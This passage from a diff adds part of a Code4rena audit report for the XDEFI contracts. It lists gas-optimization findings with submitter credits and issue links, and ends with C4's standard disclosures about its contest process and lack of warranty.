+- [[G-07] Use `calldata` instead of `memory` for external functions where the function argument is read-only.](https://github.com/code-423n4/2022-01-xdefi-findings/issues/29) _Submitted by Dravee, also found by Czar102, defsec, and TomFrenchBlockchain_
+- [[G-08] `> 0 can be replaced with != 0 for gas optimization`](https://github.com/code-423n4/2022-01-xdefi-findings/issues/88) _Submitted by defsec, also found by Dravee and Jujic_
+- [[G-09] Prefix increments are cheaper than postfix increments](https://github.com/code-423n4/2022-01-xdefi-findings/issues/9) _Submitted by robee, also found by Dravee, Tomio, and WatchPug_
+- [[G-10] Use Custom Errors to save Gas](https://github.com/code-423n4/2022-01-xdefi-findings/issues/22) _Submitted by Dravee, also found by GiveMeTestEther_
+- [[G-11] Gas: avoid unnecessary SSTORE on `proposeOwnership`](https://github.com/code-423n4/2022-01-xdefi-findings/issues/51) _Submitted by Dravee_
+- [[G-12] Gas Optimization: Tight variable packing in `XDEFIDistribution.sol`](https://github.com/code-423n4/2022-01-xdefi-findings/issues/54) _Submitted by Dravee_
+- [[G-13] gas optimization](https://github.com/code-423n4/2022-01-xdefi-findings/issues/103) _Submitted by Fitraldys_
+- [[G-14] Gas optimization in XDEFIDistribution.sol - variable that is not used](https://github.com/code-423n4/2022-01-xdefi-findings/issues/120) _Submitted by OriDabush, also found by WatchPug_
+- [[G-15] Gas optimization in XDEFIDistribution.sol - inlining some functions](https://github.com/code-423n4/2022-01-xdefi-findings/issues/121) _Submitted by OriDabush_
+- [[G-16] Gas optimization in XDEFIDistribution.sol - shifting instead of multiplying or dividing by power of 2](https://github.com/code-423n4/2022-01-xdefi-findings/issues/122) _Submitted by OriDabush, also found by WatchPug_
+- [[G-17] Unneccessary check on total supply of XDEFI token](https://github.com/code-423n4/2022-01-xdefi-findings/issues/3) _Submitted by TomFrenchBlockchain, also found by onewayfunction_
+- [[G-18] `pointCorrection` can be stored in a uint256 rather than int256 to save gas from casting.](https://github.com/code-423n4/2022-01-xdefi-findings/issues/87) _Submitted by TomFrenchBlockchain, also found by WatchPug_
+- [[G-19] Sub-optimal calls should be allowed instead of reverted as resending the transaction will cost more gas](https://github.com/code-423n4/2022-01-xdefi-findings/issues/116) _Submitted by WatchPug_
+- [[G-20] `XDEFIDistribution.sol#relock()` Implementation can be simpler and save some gas](https://github.com/code-423n4/2022-01-xdefi-findings/issues/123) _Submitted by WatchPug_
+- [[G-21] Field bonusMultiplier of struct Position can be removed](https://github.com/code-423n4/2022-01-xdefi-findings/issues/101) _Submitted by wuwe1, also found by WatchPug_
+- [[G-22] `XDEFIDistribution.sol#_updateXDEFIBalance()` Avoiding unnecessary storage writes can save gas](https://github.com/code-423n4/2022-01-xdefi-findings/issues/151) _Submitted by WatchPug_
+- [[G-23] Adding unchecked directive can save gas](https://github.com/code-423n4/2022-01-xdefi-findings/issues/185) _Submitted by defsec_
+- [[G-24] Less than 256 uints are not gas efficient](https://github.com/code-423n4/2022-01-xdefi-findings/issues/97) _Submitted by defsec_
+- [[G-25] && operator can use more gas](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) _Submitted by rfa_
+- [[G-26] Unnecessary array boundaries check when loading an array element twice](https://github.com/code-423n4/2022-01-xdefi-findings/issues/8) _Submitted by robee_
+- [[G-27] Unnecessary require statement](https://github.com/code-423n4/2022-01-xdefi-findings/issues/179) _Submitted by sirhashalot_
+- [[G-28] XDEFIDistribution: _unlock function should only be called with tokenId_ parameter](https://github.com/code-423n4/2022-01-xdefi-findings/issues/98) _Submitted by PierrickGT_
+
+# Disclosures
+
+C4 is an open organization governed by participants in the community.
+
+C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.
+
+C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
